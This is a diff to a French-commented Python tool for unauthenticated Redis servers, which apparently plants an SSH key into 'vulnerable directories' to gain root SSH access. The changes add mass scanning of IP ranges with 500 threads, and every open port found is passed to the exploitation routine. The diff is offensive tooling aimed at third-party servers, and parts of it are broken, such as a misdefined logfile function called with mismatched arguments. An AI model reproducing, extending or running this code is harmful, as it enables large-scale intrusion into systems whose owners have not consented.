@@ -11,12 +11,15 @@ Date        : 06-12-23
 import argparse
 import base64
 import datetime
+import ipaddress
 import logging
 import os
 import re
+import socket
 import subprocess
 import sys
 import time
+from concurrent.futures import ThreadPoolExecutor
 from typing import List, Tuple
 
 import redis
@@ -26,9 +29,11 @@ import requests
 class RedisConfig:
     CLI_PATHS = ['/usr/bin/redis-cli', '/usr/local/bin/redis-cli']
     DEFAULT_PORT = '6379'
+    DEFAULT_THREADS = 500
     DEFAULT_USER = 'root'
     DEFAULT_SSH_KEY = 'id_ed25519.pub'
     DEFAULT_TIMEOUT = 5
+    DEFAULT_OUTPUT_FILE = 'output.log'
     VULNERABLE_DIRECTORIES = [
         "/usr/share/nginx/html", "/var/www/html", "/var/www/phpMyAdmin",
         "/home/redis/.ssh", "/var/lib/redis/.ssh",
@@ -65,6 +70,11 @@ class FileHandler:
     @staticmethod
     def write_lines(file_path: str, lines: List[str]):
         with open(file_path, 'w', encoding='utf-8') as file:
+            file.writelines(lines)
+
+    @staticmethod
+    def append_lines(file_path: str, lines: List[str]):
+        with open(file_path, 'a', encoding='utf-8') as file:
             file.writelines(lines)
 
     @staticmethod
@@ -149,11 +159,10 @@ class RedisUtility:
             modified_file_path = os.path.join(path, f"modified_{file_name}")
             self.download_and_replace_lines(url, original_file_path, modified_file_path)
 
-
     def redis_get_modules(self) -> Tuple[bool, str]:
         success, serveur_message = self.execute_command_redis(["MODULE", "LIST"])
-        if success and serveur_message is not '':
-            logging.info("List des modules : %s", serveur_message)
+        if success and serveur_message != '':
+            self.logfile("List des modules : %s", serveur_message)
             return True, serveur_message
         logging.debug("List des modules : Aucun module trouvé")
         return False, "Aucun module trouvé"
@@ -191,7 +200,21 @@ class RedisUtility:
         logging.debug("Redis execute_command: %s", redis_command)
         command = [self.binary_redis, "-h", self.ip_address, "-p", str(self.port)] + redis_command
         success, stdout_output, stderr_output = self.execute_command(command)
-        return (True, stdout_output) if success else (False, stderr_output)
+        result = (success, stdout_output, stderr_output)  # Création du tuple result
+        return RedisUtility._checkRedisResult(result, command)
+
+    @staticmethod
+    def _checkRedisResult(result: tuple, command: List[str]) -> Tuple[bool, str]:
+        success, stdout, stderr = result
+
+        if not success:
+            if "Server closed the connection" in stderr or "Connection reset by peer" in stderr:
+                return False, "Connexion interrompue."
+            else:
+                return False, f"Erreur : {stderr}"
+        elif "NOAUTH Authentication required" in stdout:
+            return False, "Authentification requise."
+        return True, stdout
 
     @staticmethod
     def execute_command(command: List[str]) -> Tuple[bool, str, str]:
@@ -217,7 +240,9 @@ class RedisServerManager:
         port: str = RedisConfig.DEFAULT_PORT,
         user: str = RedisConfig.DEFAULT_USER,
         ssh_key: str = RedisConfig.DEFAULT_SSH_KEY,
-        timeout: int = RedisConfig.DEFAULT_TIMEOUT
+        timeout: int = RedisConfig.DEFAULT_TIMEOUT,
+        threads: int = RedisConfig.DEFAULT_THREADS,
+        outfile: str = RedisConfig.DEFAULT_OUTPUT_FILE
     ):
         self.ip_address = ip_address
         self.port = port
@@ -225,6 +250,8 @@ class RedisServerManager:
         self.ssh_key = ssh_key
         self.ssh_key_private = self._derive_ssh_key_private(ssh_key)
         self.timeout = timeout
+        self.threads = threads
+        self.outfile = outfile
         self.directory_path = self._determine_directory_path(user)
         self.binary_redis = self._check_binary()
         self.redis_utility = RedisUtility(ip_address, port, self.binary_redis)
@@ -262,6 +289,26 @@ class RedisServerManager:
             logging.error("Le client SSH n'est pas installé.")
             raise EnvironmentError("Le client SSH n'est pas installé. Veuillez installer un client SSH (ex. : 'apt install openssh-client').") from exc
 
+    def checkRedisResult(self, result: subprocess.CompletedProcess, command: List[str]) -> Tuple[bool, str]:
+        """
+        Vérifie le résultat de l'exécution d'une commande Redis.
+        Args:
+            result (subprocess.CompletedProcess): Le résultat de l'exécution de la commande.
+            command (List[str]): La commande qui a été exécutée.
+        Returns:
+            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
+        """
+        error_msg = result.stderr.strip()
+        result_msg = result.stdout.strip()
+        return_code = result.returncode
+        if "NOAUTH Authentication required" in result_msg:
+            return False, "Authentification requise."
+        elif "Server closed the connection" in error_msg or "Connection reset by peer" in error_msg:
+            return False, "Connexion interrompue."
+        elif return_code != 0:
+            return False, "Erreur inconnue."
+        return True, result_msg
+
     def _find_redis_cli(self) -> str:
         for path in RedisConfig.CLI_PATHS:
             if os.path.isfile(path):
@@ -271,14 +318,11 @@ class RedisServerManager:
 
     def process_server(self) -> Tuple[bool, str]:
         logging.info(
-            "Tentative de connexion à %s:%s avec l'utilisateur %s et la clé SSH '%s' "
-            "(timeout %s sec) écriture dans %s",
+            "Tentative de connexion à %s:%s (timeout %s sec) threads %s",
             self.ip_address,
             self.port,
-            self.user,
-            self.ssh_key,
             self.timeout,
-            self.directory_path,
+            self.threads
         )
         success, msg = self.redis_get_banner()
 
@@ -307,6 +351,7 @@ class RedisServerManager:
         success, data = self.redis_utility.execute_command_redis(["INFO"])
         if not success:
             return False, data
+
         redis_version = re.search(r"redis_version:(.*?)\n", data).group(1)
         redis_os = re.search(r"os:(.*?)\n", data).group(1)
         redis_role = re.search(r"role:(.*?)\n", data).group(1)
@@ -327,16 +372,16 @@ class RedisServerManager:
         )
 
         # Afficher les valeurs extraites
-        logging.info(f"Redis Version: {redis_version}")
-        logging.info(f"Redis Operating System: {redis_os}")
+        self.logfile(f"Redis Version: {redis_version}")
+        self.logfile(f"Redis Operating System: {redis_os}")
 
-        logging.info(f"Redis Role: {redis_role}")
+        self.logfile(f"Redis Role: {redis_role}")
 
         # Affichez la durée
-        logging.info(f"Uptime in Seconds: {uptime_in_seconds} ({uptime_str})")
-        logging.info(f"Used Memory: {used_memory} bytes")
-        logging.info(f"Total Connections Received: {total_connections_received}")
-        logging.info(f"Total Commands Processed: {total_commands_processed}")
+        self.logfile(f"Uptime in Seconds: {uptime_in_seconds} ({uptime_str})")
+        self.logfile(f"Used Memory: {used_memory} bytes")
+        self.logfile(f"Total Connections Received: {total_connections_received}")
+        self.logfile(f"Total Commands Processed: {total_commands_processed}")
         return True, "OK"
 
     def find_vulnerable_directory(self) -> Tuple[bool, str]:
@@ -389,6 +434,12 @@ class RedisServerManager:
         if result.returncode != 0:
             return False, result.stderr.strip()
         return True, "Commande exécutée avec succès."
+    # @staticmethod
+
+
+def logfile(self, messsage: str):
+    logging.info(messsage)
+    FileHandler.write_lines(self.outfile, messsage)
 
 
 def execute_ssh_command(self) -> Tuple[bool, str]:
@@ -417,46 +468,76 @@ def execute_ssh_command(self) -> Tuple[bool, str]:
         ]
 
 
-def process_file(file_path: str, port: str, user: str, ssh_key: str, timeout: int):
-    with open(file_path, "r", encoding="utf-8") as file:
-        for ip_address in file:
-            ip_address = ip_address.strip()
-            if ip_address:
-                manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
-                success, message = manager.process_server()
-                logging.info(
-                    "IP %s - Résultat : %s, Message : %s", ip_address, success, message
-                )
+def process_file(file_path: str, port: str, user: str, ssh_key: str, timeout: int, threads: int, outfile: str):
+    logging.debug(f"Traitement du fichier : {file_path}")
+    # Fonction pour traiter une adresse IP
+
+    def process_ip(ip_address):
+        logging.debug(f"Traitement de l'adresse IP : {ip_address}")
+        manager = RedisServerManager(ip_address, port, user, ssh_key, timeout, threads, outfile)
+        success, message = manager.process_server()
+        logfile(f"IP {ip_address} - Résultat : {success}, Message : {message}")
+    # Utilisation de ThreadPoolExecutor pour exécuter process_ip en parallèle pour chaque adresse IP
+    with ThreadPoolExecutor(max_workers=threads) as executor:  # Ajustez max_workers selon vos besoins
+        with open(file_path, "r", encoding="utf-8") as file:
+            for ip_address in file:
+                ip_address = ip_address.strip()
+                if ip_address:
+                    # Soumettre la fonction process_ip pour exécution
+                    executor.submit(process_ip, ip_address)
 
 
-def process_scan(scan: str, port: str, user: str, ssh_key: str, timeout: int):
-    # scan par zgrab2
+def process_scan(scan_range, port: str, user: str, ssh_key: str, timeout: int, threads: int, outfile: str):
+    start_ip, end_ip = scan_range
+    logfile(f"Scan de la plage IP : {start_ip} à {end_ip}")
+    start_ip = ipaddress.ip_address(start_ip)
+    end_ip = ipaddress.ip_address(end_ip)
 
-    # on verifie la presence de golang
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        while start_ip <= end_ip:
+            ip_address = str(start_ip)
+            executor.submit(scan_port, ip_address, port, user, ssh_key, timeout, threads, outfile)
+            start_ip += 1
+
+
+def scan_port(ip_address, port, user, ssh_key, timeout, threads, outfile):
+    logging.debug(f"Tentative de connexion à {ip_address}:{port}")
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)  # Timeout en secondes
     try:
-        subprocess.run(["masscan", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
-    except subprocess.CalledProcessError:
-        logging.error("Le client masscan n'est pas installé. Veuillez installer un client masscan (ex. : 'apt install masscan').")
-
-        # manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
-        # success, message = manager.process_server()
-        # logging.info(f"IP {ip_address} - Résultat : {success}, Message : {message}")
+        sock.connect((ip_address, port))
+        logging.debug(f"Port {port} ouvert sur {ip_address}")
+        manager = RedisServerManager(ip_address, str(port), user, ssh_key, timeout, threads, outfile)
+        success, message = manager.process_server()
+        if not success:
+            logging.warning(f"Error processing server {ip_address} : {message}")
+            return
+        logfile(
+            "IP %s, Message : %s", ip_address, message
+        )
+    except socket.error as e:
+        logging.debug(f"Port {port} fermé sur {ip_address} ou erreur : {e}")
+    finally:
+        sock.close()
 
 
 def parse_arguments() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="Gestionnaire de serveurs Redis non authentifiés", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
     parser.add_argument('-i', '--ip', help="Adresse IP du serveur Redis")
     parser.add_argument('-f', '--file', help="Chemin du fichier contenant les adresses IP")
-    parser.add_argument('-sc', '--scan', help="Scan des adresses IP")
+    parser.add_argument('-sc', '--scan', nargs=2, help="Plage d'adresses IP à scanner (ex: --scan 120.138.21.0 120.138.21.255)")
+    parser.add_argument('-sf', '--scanfile', help="Nom du fichier contenant les adresses IP à scanner (IP IP séparées par des espaces)")
     parser.add_argument('-b', '--banner', action='store_true', help="Afficher la bannière")
     parser.add_argument('-p', '--port', type=int, default=RedisConfig.DEFAULT_PORT, help="Port du serveur Redis")
     parser.add_argument('-u', '--user', default=RedisConfig.DEFAULT_USER, help="Utilisateur SSH pour la connexion")
     parser.add_argument('-s', '--sshKey', default=RedisConfig.DEFAULT_SSH_KEY, help="Chemin du fichier de clé SSH")
     parser.add_argument('-t', '--timeout', type=int, default=RedisConfig.DEFAULT_TIMEOUT, help="Délai de connexion")
+    parser.add_argument('-of', '--outfile', type=str, default=RedisConfig.DEFAULT_OUTPUT_FILE, help="Nom du fichier de sortie")
+    parser.add_argument('--threads', type=int, default=RedisConfig.DEFAULT_THREADS, help="Number of threads to use")
     parser.add_argument('-v', '--verbose', action='store_true', help="Augmenter la verbosité des logs")
     args = parser.parse_args()
 
-    if not (args.ip or args.file):
+    if not (args.ip or args.file or args.scan or args.scanfile):
         parser.print_help()
         sys.exit(1)
 
@@ -466,8 +547,8 @@ def parse_arguments() -> argparse.Namespace:
 def main():
     args = parse_arguments()
     configure_logging(args.verbose)
-
-    if not (args.ip or args.file or args.scan):
+    logging.debug("Arguments de la ligne de commande : %s", args)
+    if not (args.ip or args.file or args.scan or args.scanfile):
         logging.warning(
             "Aucune adresse IP ou chemin de fichier spécifié. "
             "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
@@ -475,16 +556,26 @@ def main():
             "'-sc' pour scanner les adresses IP. "
             "Utilisez '--help' pour plus d'informations."
         )
+    elif args.scanfile:
+        with open(args.scanfile, "r", encoding="utf-8") as file:
+            for line in file:
+                ip_range = line.strip().split()
+                if len(ip_range) == 2:
+                    process_scan(
+                        ip_range, args.port, args.user, args.sshKey, args.timeout, args.threads, args.outfile
+                    )
+
     elif args.ip:
         manager = RedisServerManager(
-            args.ip, args.port, args.user, args.sshKey, args.timeout
+            args.ip, args.port, args.user, args.sshKey, args.timeout, args.threads, args.outfile
         )
         success, message = manager.process_server()
-        logging.info("IP %s - Résultat : %s, Message : %s", args.ip, success, message)
+        logfile("IP %s - Résultat : %s, Message : %s", args.ip, success, message)
     elif args.scan:
-        process_scan(args.scan, args.port, args.user, args.sshKey, args.timeout)
+        logging.debug("Début du scan de la plage IP %s", args.scan)
+        process_scan(args.scan, args.port, args.user, args.sshKey, args.timeout, args.threads, args.outfile)
     else:
-        process_file(args.file, args.port, args.user, args.sshKey, args.timeout)
+        process_file(args.file, args.port, args.user, args.sshKey, args.timeout, args.threads, args.outfile)
 
 
 if __name__ == "__main__":
